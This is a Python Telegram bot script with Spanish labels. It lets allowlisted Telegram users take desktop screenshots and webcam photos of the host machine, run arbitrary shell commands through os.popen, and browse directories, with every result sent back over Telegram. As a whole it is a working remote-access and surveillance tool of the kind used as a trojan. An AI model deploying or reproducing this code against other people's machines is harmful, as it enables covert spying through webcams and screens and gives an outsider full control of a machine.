from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import pyscreenshot
import os
from cv2 import cv2
from config import TOKEN, permitidos


def comprobar_id(funcion_parametro):
    def id_ok(update: Update, context: CallbackContext) -> None:
        if update.effective_user.id in permitidos:
            funcion_parametro(update, context)
        else:
            update.effective_user.send_message("No tienes permisos")

    return id_ok


def leer_mandar_foto(funcion_parametro):
    def leer_foto(update: Update, context: CallbackContext):
        if os.name == 'nt':
            nombre_foto = "C:\\nc\\foto_telegram.png"
        else:
            nombre_foto = "/tmp/foto_telegram.png"

        funcion_parametro(update, context, nombre_foto)

        if os.path.exists(nombre_foto):
            with open(nombre_foto, "rb") as f:
                foto = f.read()
                update.effective_user.send_photo(foto)

            os.remove(nombre_foto)
        else:
            update.effective_user.send_message("No se ha hecho la foto")

    return leer_foto


# Define a few command handlers. These usually take the two arguments update and
# context. Error handlers also receive the raised TelegramError object in error.
@comprobar_id
@leer_mandar_foto
def captura_pantalla(update: Update, context: CallbackContext, foto) -> None:
    """Sacar captura de webcam"""
    # update.message.reply_text(update.message.chat_id)
    # update.message.reply_text(update.effective_user.id)
    # update.message.reply_text(update.effective_user.full_name)
    # update.message.reply_text(update.effective_user.first_name)
    # update.message.reply_text(update.effective_user.username)
    # update.effective_user.send_message("hola")
    f = pyscreenshot.grab()
    f.save(foto)


@comprobar_id
@leer_mandar_foto
def captura_webcam(update: Update, context: CallbackContext, foto) -> None:
    """Sacar captura de webcam"""
    cap = cv2.VideoCapture(0)
    leido, frame = cap.read()

    if leido:
        cv2.imwrite(foto, frame)


@comprobar_id
def ejecutar_comando(update: Update, context: CallbackContext):
    """Ejecutar comando externo"""
    argumentos = " ".join(str(i) for i in context.args)
    salida = os.popen(argumentos).read()
    update.effective_user.send_message(salida)


@comprobar_id
def cambiar_directorio(update: Update, context: CallbackContext):
    """Cambiar de directorio"""
    cantidad = len([1 for i in context.args])
    if not cantidad or context.args[0] == '~':
        os.chdir(os.path.expanduser("~"))
        update.effective_user.send_message(os.getcwd())
    elif cantidad == 1:
        try:
            os.chdir(context.args[0])
            update.effective_user.send_message(os.getcwd())
        except FileNotFoundError:
            update.effective_user.send_message("No existe esa ruta")
    else:
        update.effective_user.send_message("Solo se puede mandar un argumento")


@comprobar_id
def dame_ruta(update: Update, context: CallbackContext):
    """Imprimir ruta actual"""
    ruta = os.getcwd()
    update.effective_user.send_message(ruta)


@comprobar_id
def listar_directorio(update: Update, context: CallbackContext):
    """Listar directorio"""
    argumento = " ".join(str(i) for i in context.args)
    cantidad = len(argumento)
    if not cantidad:
        listado = "\n".join(os.listdir())
        update.effective_user.send_message(listado)
    elif cantidad == 1:
        try:
            listado = "\n".join(os.listdir(context.args[0]))
            update.effective_user.send_message(listado)
        except FileNotFoundError:
            update.effective_user.send_message("No existe esa ruta")
    else:
        update.effective_user.send_message("Solo se puede mandar un argumento")


def main():
    """Start the bot."""
    # Create the Updater and pass it your bot's token.
    updater = Updater(TOKEN)

    # Get the dispatcher to register handlers
    dispatcher = updater.dispatcher

    # on different commands - answer in Telegram
    dispatcher.add_handler(CommandHandler("screenshot", captura_pantalla))
    dispatcher.add_handler(CommandHandler("webcam", captura_webcam))
    dispatcher.add_handler(CommandHandler("sh", ejecutar_comando))
    dispatcher.add_handler(CommandHandler("cmd", ejecutar_comando))
    dispatcher.add_handler(CommandHandler("pwd", dame_ruta))
    dispatcher.add_handler(CommandHandler("cd", cambiar_directorio))
    dispatcher.add_handler(CommandHandler("ls", listar_directorio))

    # on noncommand i.e message - echo the message on Telegram
    # dispatcher.add_handler(
    #     MessageHandler(Filters.text & ~Filters.command, echo))

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()


if __name__ == '__main__':
    main()
